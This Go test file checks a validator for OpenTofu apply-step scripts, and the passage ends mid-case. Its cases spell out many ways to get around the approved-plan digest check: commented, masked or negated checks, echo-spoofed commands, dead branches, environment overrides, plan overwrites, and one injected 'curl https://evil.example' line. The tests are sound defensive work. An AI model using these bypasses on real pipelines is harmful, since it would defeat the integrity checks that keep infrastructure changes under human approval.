package inputs

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"
)

const applyQuoteBaseline = `sha256sum --strict -c -
grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256
tofu init -input=false -lockfile=readonly
tofu apply -input=false -auto-approve /workspace/plan.tfplan
`

func TestApplyQuotedHashSafety(t *testing.T) {
	for _, tc := range []struct{ name, line string }{
		{"environment", `echo "#"; export TF_CLI_ARGS=-target=x`},
		{"overwrite", `echo "#"; cp /tmp/x /workspace/plan.tfplan`},
		{"extra apply", `echo '#'; tofu apply -input=false -auto-approve -target=x /workspace/plan.tfplan`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Arrange.
			script := tc.line + "\n" + applyQuoteBaseline
			// Act.
			err := ValidateApplyStepScript(script)
			// Assert.
			if err == nil {
				t.Fatal("unsafe line was accepted")
			}
		})
	}
}

var (
	refSimpleBracedVar = regexp.MustCompile(`^\$\{[A-Za-z_][A-Za-z0-9_]*(?::-)?\}`)
	refBadDollarUnq    = regexp.MustCompile(`^\$['"(]|^\$\[`)
)

func referenceConsumeDoubleQuote(line string, pos int) (int, bool) {
	for pos < len(line) {
		switch line[pos] {
		case '\\':
			if pos+1 >= len(line) {
				return pos, false
			}
			_, w := utf8.DecodeRuneInString(line[pos+1:])
			pos += 1 + w
		case '"':
			return pos + 1, true
		case '`':
			return pos, false
		case '$':
			next, ok := referenceConsumeDollar(line[pos:], true)
			if !ok {
				return pos, false
			}
			pos += next
		default:
			_, w := utf8.DecodeRuneInString(line[pos:])
			pos += w
		}
	}
	return pos, false
}

func referenceConsumeDollar(rest string, inDoubleQuote bool) (int, bool) {
	if !inDoubleQuote && refBadDollarUnq.MatchString(rest) {
		return 0, false
	}
	if strings.HasPrefix(rest, "$(") || strings.HasPrefix(rest, "$[") {
		return 0, false
	}
	if strings.HasPrefix(rest, "${") {
		if loc := refSimpleBracedVar.FindStringIndex(rest); loc != nil {
			return loc[1], true
		}
		return 0, false
	}
	if len(rest) > 1 && isUnbracedApplyParamStart(rest[1]) {
		return 0, false
	}
	return 1, true
}

// referenceApplyComment independently tokenizes one shell line with lookahead regex rules.
func referenceApplyComment(line string) (string, bool) {
	pos, boundary := 0, 0 // 0=word start, 1=in word, 2=after operator
	for pos < len(line) {
		r, w := utf8.DecodeRuneInString(line[pos:])
		switch {
		case r != ' ' && r != '\t' && unicode.IsSpace(r):
			return line, false
		case r == '\\':
			if pos+1 >= len(line) {
				return line, false
			}
			r2, w2 := utf8.DecodeRuneInString(line[pos+1:])
			if r2 != ' ' && r2 != '\t' && unicode.IsSpace(r2) {
				return line, false
			}
			pos += 1 + w2
			boundary = 1
		case r == '\'':
			end := strings.IndexByte(line[pos+1:], '\'')
			if end < 0 {
				return line, false
			}
			pos += end + 2
			boundary = 1
		case r == '"':
			next, ok := referenceConsumeDoubleQuote(line, pos+1)
			if !ok {
				return line, false
			}
			pos = next
			boundary = 1
		case r == '`', strings.HasPrefix(line[pos:], "<<"), strings.HasPrefix(line[pos:], "<("), strings.HasPrefix(line[pos:], ">("):
			return line, false
		case r == '$':
			adv, ok := referenceConsumeDollar(line[pos:], false)
			if !ok {
				return line, false
			}
			pos += adv
			boundary = 1
		case r == '#' && boundary == 2:
			return line, false
		case r == '#' && boundary == 0:
			return line[:pos], true
		case r == ' ' || r == '\t':
			pos += w
			boundary = 0
		case strings.ContainsRune(";&|()<>", r):
			pos += w
			boundary = 2
		default:
			pos += w
			boundary = 1
		}
	}
	return line, true
}

func TestApplyCommentReference(t *testing.T) {
	rng := rand.New(rand.NewSource(2301))
	pieces := []string{
		"word", "a#b", `'single#hash'`, `"double#hash"`, `\#escaped`, " ", "\t", " #comment",
		`'unfinished`, `"unfinished`, `"a\"#b"`, `\`, `\\`, `\ `, "\\\t", "\r", "\v", "\f", "\u00a0", "\u2003", "\u3000",
		`"a"\ #x`, `'a'\ #x`, `${_OK}`, `"${_OK:-}"`, `${bad:- #}`, `"${bad:-" #"}"`,
		`$(cmd)`, `$[1+1]`, "`cmd`", `$'x'`, `$"x"`, `<<EOF`, `<(x)`, `>(x)`, `;#`, `(#)`, `\$`, `"\$(x)"`,
		`$`, `"$"`, `^[0-9a-f]{64}$`, `$x`, `$1`, `$?`, `$$`, `$!`,
	}
	deterministic := append([]string{
		`if [[ ! "${_APPROVED_PLAN_SHA256}" =~ ^[0-9a-f]{64}$ ]]; then exit 1; fi`,
		`echo "$" # comment`,
		`echo $ # comment`,
		`echo $x`,
		`echo $1`,
		`echo $?`,
	}, pieces...)
	for i := 0; i < 800; i++ {
		var line string
		if i < len(deterministic) {
			line = deterministic[i]
		} else {
			line = pieces[i%len(pieces)]
			for n := rng.Intn(5); n > 0; n-- {
				line += pieces[rng.Intn(len(pieces))]
			}
		}
		t.Run(fmt.Sprint(i), func(t *testing.T) {
			// Arrange.
			want, valid := referenceApplyComment(line)
			// Act.
			got, err := stripApplyComment(line)
			// Assert.
			if (err == nil) != valid || (valid && got != want) {
				t.Fatalf("line %q: got %q (%v), want %q valid=%t", line, got, err, want, valid)
			}
		})
	}
}

func TestApplyQuotedHashParseFidelity(t *testing.T) {
	// Act.
	got := parseTofuCommands(`tofu apply "value#retained"`)
	// Assert.
	if len(got) != 1 || len(got[0].args) != 1 || got[0].args[0] != `"value#retained"` {
		t.Fatalf("got %#v", got)
	}
}

func TestApplyUnterminatedQuoteRefused(t *testing.T) {
	for _, tc := range []struct{ name, line string }{{"single", `echo 'unfinished`}, {"double", `echo "unfinished`}} {
		t.Run(tc.name, func(t *testing.T) {
			// Arrange.
			script := applyQuoteBaseline + tc.line + "\n"
			// Act.
			err := ValidateApplyStepScript(script)
			// Assert.
			if err == nil || !strings.Contains(err.Error(), "unterminated quote") {
				t.Fatalf("got %v", err)
			}
		})
	}
}

func TestApplyChecksRejectUnterminatedQuotes(t *testing.T) {
	const line = `echo "unfinished`
	for _, tc := range []struct {
		name  string
		check func() bool
	}{
		{"commands", func() bool { return parseTofuCommands(line) == nil }},
		{"environment", func() bool { return checkNoEnvOverride(line) != nil }},
		{"overwrite", func() bool { return checkNoPlanOverwriteInApply(line) != nil }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Act.
			rejected := tc.check()
			// Assert.
			if !rejected {
				t.Fatal("unterminated quote was accepted")
			}
		})
	}
}

func TestApplyCommentBoundaries(t *testing.T) {
	for _, tc := range []struct{ name, line, want string }{
		{"initial hash", "# comment", ""},
		{"tab before hash", "word\t# comment", "word\t"},
		{"backslash inside single quote", `'a\' # comment`, `'a\' `},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Act.
			got, err := stripApplyComment(tc.line)
			// Assert.
			if err != nil || got != tc.want {
				t.Fatalf("got %q, %v; want %q", got, err, tc.want)
			}
		})
	}
}

func TestApplyEscapedBlankAndUnicodeSafety(t *testing.T) {
	prefixes := []struct{ name, value string }{{"escaped space", `echo \ #; `}, {"nbsp", "echo \u00a0#; "}}
	suffixes := []struct{ name, value string }{{"environment", "export TF_CLI_ARGS=-target=x"}, {"overwrite", "cp /tmp/x /workspace/plan.tfplan"}, {"extra apply", "tofu apply -input=false -auto-approve -target=x /workspace/plan.tfplan"}}
	for _, p := range prefixes {
		for _, s := range suffixes {
			t.Run(p.name+"/"+s.name, func(t *testing.T) {
				// Arrange.
				script := p.value + s.value + "\n" + applyQuoteBaseline
				// Act.
				err := ValidateApplyStepScript(script)
				// Assert.
				if err == nil {
					t.Fatal("unsafe suffix was accepted")
				}
			})
		}
	}
}

func TestApplyEscapesAdjacentToQuotes(t *testing.T) {
	for _, tc := range []struct{ name, line string }{{"after double quote", `"a"\ #x`}, {"after single quote", `'a'\ #x`}, {"after opening quote", `"\ #x"\ #x`}} {
		t.Run(tc.name, func(t *testing.T) {
			// Act.
			got, err := stripApplyComment(tc.line)
			// Assert.
			if err != nil || got != tc.line {
				t.Fatalf("got %q, %v; want %q", got, err, tc.line)
			}
		})
	}
}

func TestApplyUnsupportedWhitespace(t *testing.T) {
	for _, r := range []rune{'\r', '\v', '\f', '\u00a0', '\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200a', '\u3000'} {
		t.Run(fmt.Sprintf("U+%04X", r), func(t *testing.T) {
			// Act.
			_, err := stripApplyComment("echo " + string(r) + "# text")
			// Assert.
			if err == nil || !strings.Contains(err.Error(), "unsupported whitespace") {
				t.Fatalf("got %v", err)
			}
		})
	}
}

func TestApplyWordBoundaryControls(t *testing.T) {
	for _, tc := range []struct{ name, line, want string }{
		{"trailing comment", "echo x # comment", "echo x "},
		{"leading comment", "# comment", ""},
		{"midword hash", "echo a#b", "echo a#b"},
		{"quoted unicode", "echo \"a\u00a0#b\"", "echo \"a\u00a0#b\""},
		{"quoted carriage return preserved", "echo \"x\r#tail\"", "echo \"x\r#tail\""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Act.
			got, err := stripApplyComment(tc.line)
			// Assert.
			if err != nil || got != tc.want {
				t.Fatalf("got %q, %v; want %q", got, err, tc.want)
			}
		})
	}
}

func TestApplyPhysicalContinuationRefused(t *testing.T) {
	prefixes := []struct{ name, first, second string }{
		{"unquoted", "echo x\\\n", "#; "},
		{"double quoted", "echo \"x\\\n", "#\"; "},
	}
	suffixes := []struct{ name, line string }{
		{"environment", "export TF_CLI_ARGS=-target=x"},
		{"overwrite", "cp /tmp/x /workspace/plan.tfplan"},
		{"extra apply", "tofu apply -input=false -auto-approve -target=x /workspace/plan.tfplan"},
	}
	for _, p := range prefixes {
		for _, s := range suffixes {
			t.Run(p.name+"/"+s.name, func(t *testing.T) {
				// Arrange.
				script := p.first + p.second + s.line + "\n" + applyQuoteBaseline
				// Act.
				err := ValidateApplyStepScript(script)
				// Assert.
				if err == nil || !strings.Contains(err.Error(), "line continuation is not supported") {
					t.Fatalf("got %v, want continuation refusal", err)
				}
			})
		}
	}
}

func continuationResultMatches(err error, wantErr bool) bool {
	return (!wantErr && err == nil) || (wantErr && err != nil && strings.Contains(err.Error(), "line continuation is not supported"))
}

func TestApplyContinuationControls(t *testing.T) {
	for _, tc := range []struct {
		name, prefix string
		wantErr      bool
	}{
		{"baseline", "", false}, {"full line comment", "# comment\n", false},
		{"trailing comment", "echo safe # comment\n", false}, {"even backslashes", "echo x\\\\\n", false},
		{"harmless continuation", "echo a\\\nb\n", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Arrange.
			script := tc.prefix + applyQuoteBaseline
			// Act.
			err := ValidateApplyStepScript(script)
			// Assert.
			if !continuationResultMatches(err, tc.wantErr) {
				t.Fatalf("got %v, want continuation error %t", err, tc.wantErr)
			}
		})
	}
}

func TestApplyContinuationGeneratedScripts(t *testing.T) {
	rng := rand.New(rand.NewSource(2303))
	baseline := strings.Split(strings.TrimSuffix(applyQuoteBaseline, "\n"), "\n")
	for i := 0; i < 120; i++ {
		at := rng.Intn(len(baseline) + 1)
		n := rng.Intn(1000000)
		for _, tc := range []struct {
			name, line, next string
			wantErr          bool
		}{
			{"unquoted", fmt.Sprintf("echo v%d\\", n), "# ignored", true},
			{"double", fmt.Sprintf("echo \"v%d\\", n), "#\"", true},
			{"even", fmt.Sprintf("echo v%d\\\\", n), "# comment", false},
		} {
			t.Run(fmt.Sprintf("%d/%s", i, tc.name), func(t *testing.T) {
				// Arrange.
				lines := append([]string(nil), baseline[:at]...)
				lines = append(lines, tc.line, tc.next)
				lines = append(lines, baseline[at:]...)
				script := strings.Join(lines, "\n") + "\n"
				// Act.
				err := ValidateApplyStepScript(script)
				// Assert.
				if !continuationResultMatches(err, tc.wantErr) {
					t.Fatalf("got %v, want continuation error %t", err, tc.wantErr)
				}
			})
		}
	}
}

func TestApplyExpansionAndOperatorHashSafety(t *testing.T) {
	prefixes := []struct{ name, prefix string }{
		{"unquoted param expansion", `echo ${x:- #}; `},
		{"double-quoted param expansion", `echo "${x:-" #"}"; `},
		{"double-quoted command substitution", `echo "$(echo " #")"; `},
		{"double-quoted backtick", "echo \"`echo \" #\"`\"; "},
		{"ANSI-C single quote", `echo $'a\' #'; `},
		{"locale double quote", `echo $"a #"; `},
		{"operator-adjacent hash in regex", `[[ "#" =~ (#) ]]; `},
	}
	suffixes := []struct{ name, line string }{
		{"environment", "export TF_CLI_ARGS=-target=x"},
		{"overwrite", "cp /tmp/x /workspace/plan.tfplan"},
		{"extra apply", "tofu apply -input=false -auto-approve -target=x /workspace/plan.tfplan"},
	}
	for _, p := range prefixes {
		for _, s := range suffixes {
			t.Run(p.name+"/"+s.name, func(t *testing.T) {
				// Arrange.
				script := p.prefix + s.line + "\n" + applyQuoteBaseline
				// Act.
				err := ValidateApplyStepScript(script)
				// Assert.
				if err == nil {
					t.Fatalf("unsafe prefix %q + suffix %q was accepted", p.prefix, s.line)
				}
			})
		}
	}
}

func TestApplyCommentedOrHeredocGateBypassRefused(t *testing.T) {
	cases := []struct{ name, script string }{
		{
			name: "commented stdin digest check",
			script: "# sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "trailing comment digest check",
			script: "true # sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "commented sidecar grep check",
			script: "sha256sum --strict -c -\n" +
				`true;# grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name:   "heredoc wrapping baseline",
			script: "cat <<'EOF'\n" + applyQuoteBaseline + "EOF\n",
		},
		{
			name:   "unquoted backtick substitution",
			script: "echo `echo x`\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted command substitution",
			script: "echo $(echo x)\n" + applyQuoteBaseline,
		},
		{
			name:   "deprecated bracket arithmetic expansion",
			script: "echo $[1+1]\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted input process substitution",
			script: "cat <(echo hi)\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted output process substitution",
			script: "tee >(cat)\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted carriage return whitespace",
			script: "tofu apply -input=false -auto-approve /workspace/plan.tfplan\r\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted vertical tab whitespace",
			script: "tofu apply -input=false -auto-approve /workspace/plan.tfplan\v\n" + applyQuoteBaseline,
		},
		{
			name:   "unquoted form feed whitespace",
			script: "tofu apply -input=false -auto-approve /workspace/plan.tfplan\f\n" + applyQuoteBaseline,
		},
		{
			name: "multi-space masked sha256sum",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c - ||  true\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "masked sidecar grep check",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || true` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "echo fake digest check",
			script: "echo 'sha256sum --strict -c -'\n" +
				": grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "post-apply digest verification",
			script: "tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n" +
				"sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Act.
			err := ValidateApplyStepScript(tc.script)
			// Assert.
			if err == nil {
				t.Fatalf("bypass %s was accepted", tc.name)
			}
		})
	}
}

func TestApplyFakeDigestInvocationsRefused(t *testing.T) {
	cases := []struct{ name, script string }{
		{
			name: "true command argument",
			script: "true 'sha256sum --strict -c -'\n" +
				"true 'grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256'\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "printf argument",
			script: "printf '%s\\n' 'sha256sum --strict -c -'\n" +
				`printf '%s\n' 'grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256'` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "variable assignment",
			script: "dummy='sha256sum --strict -c -'\n" +
				`other='grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256'` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "separator prefixed echo",
			script: "true; echo 'sha256sum --strict -c -'\n" +
				`:; echo 'grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256'` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "dead if false branch",
			script: "if false; then sha256sum --strict -c -; fi\n" +
				`if false; then grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256; fi` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep placed in sidecar else branch",
			script: "sha256sum --strict -c -\n" +
				"if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n" +
				"  true\n" +
				"else\n" +
				`  grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"fi\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "same-line post-apply digest verification",
			script: "tofu init -input=false -lockfile=readonly\n" +
				`tofu apply -input=false -auto-approve /workspace/plan.tfplan; printf '%s  /workspace/plan.tfplan\n' "${_APPROVED_PLAN_SHA256}" | sha256sum --strict -c -; grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n",
		},
		{
			name: "gated behind false &&",
			script: "false && sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "sha256sum piped into true",
			script: "sha256sum --strict -c - | true\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateApplyStepScript(tc.script); err == nil {
				t.Fatalf("bypass %s was accepted", tc.name)
			}
		})
	}
}

func TestApplyMaskAndNegationBypassesRefused(t *testing.T) {
	cases := []struct{ name, script string }{
		{
			name: "unspaced ||true on sha256sum",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -||true\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "unspaced ||colon on grep",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256||:` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "sidecar sha256sum without approved env var masked",
			script: "sha256sum --strict -c -\n" +
				"if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n" +
				"  sha256sum --strict -c /workspace/plan.tfplan.sha256 || true\n" +
				`  grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || exit 1` + "\n" +
				"fi\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "multi-line pipe masked with || true",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" |\n" +
				"sha256sum --strict -c - || true\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name:   "trailing || operator on digest check",
			script: "sha256sum --strict -c - ||\n",
		},
		{
			name: "grep masked with || echo ok",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || echo ok` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with || exit 0",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || exit 0` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with || exit 256 overflow",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || exit 256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with non-exiting brace block",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || { echo ignored; }` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with non-echo brace block",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || { cp /tmp/a /tmp/b; exit 1; }` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "negated sha256sum pipeline",
			script: "! sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "negated grep sidecar check",
			script: "sha256sum --strict -c -\n" +
				`! grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "brace-wrapped masked sha256sum",
			script: "{ sha256sum --strict -c -; } || true\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "digest inside if condition",
			script: "if sha256sum --strict -c -; then echo ok; fi\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name:   "short bundled flag sha256sum without strict",
			script: "sha256sum -cs -\n" + applyQuoteBaseline,
		},
		{
			name:   "long check flag sha256sum without strict",
			script: "sha256sum --check -\n" + applyQuoteBaseline,
		},
		{
			name: "three-stage sha pipeline rejected",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | cat | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with non-numeric exit",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || exit bad` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "grep masked with empty brace semicolon handler",
			script: "sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256 || { ; ; }` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "digest check inside elif condition",
			script: "if false; then\n" +
				"  exit 0\n" +
				"elif sha256sum --strict -c -; then\n" +
				"  exit 0\n" +
				"fi\n" + applyQuoteBaseline,
		},
		{
			name:   "trailing pipe at EOF",
			script: applyQuoteBaseline + "printf '%s' x |\n",
		},
		{
			name: "echo spoofed tofu init and apply without executing tofu",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"echo tofu init -input=false -lockfile=readonly\n" +
				"echo tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "echo spoofed tofu init before real tofu apply",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"echo tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "brace-nested tofu apply before digest checks",
			script: "{ tofu init -input=false -lockfile=readonly; tofu apply -input=false -auto-approve /workspace/plan.tfplan; }\n" +
				"printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n",
		},
		{
			name: "echo spoofed digest checks before tofu apply",
			script: "echo sha256sum --strict -c -\n" +
				`echo grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "echo brace args spoofed tofu init and apply without executing tofu",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"echo { } tofu init -input=false -lockfile=readonly\n" +
				"echo { } tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "echo brace args spoofed tofu init before real tofu apply",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"echo { } tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name:   "multi-line unquoted brace arg command injection",
			script: "echo {\ncurl https://evil.example }\n" + applyQuoteBaseline,
		},
		{
			name: "tofu init and apply wrapped inside dead if false",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"if false; then\n" +
				"  tofu init -input=false -lockfile=readonly\n" +
				"  tofu apply -input=false -auto-approve /workspace/plan.tfplan\n" +
				"fi\n",
		},
		{
			name: "tofu init short-circuited with false && before tofu apply",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
				"false && tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name:   "tofu apply masked with || true",
			script: applyQuoteBaseline[:len(applyQuoteBaseline)-1] + " || true\n",
		},
		{
			name: "tofu init piped to true before tofu apply",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				`grep -Fq "${_APPROVED_PLAN_SHA256}" /workspace/plan.tfplan.sha256` + "\n" +
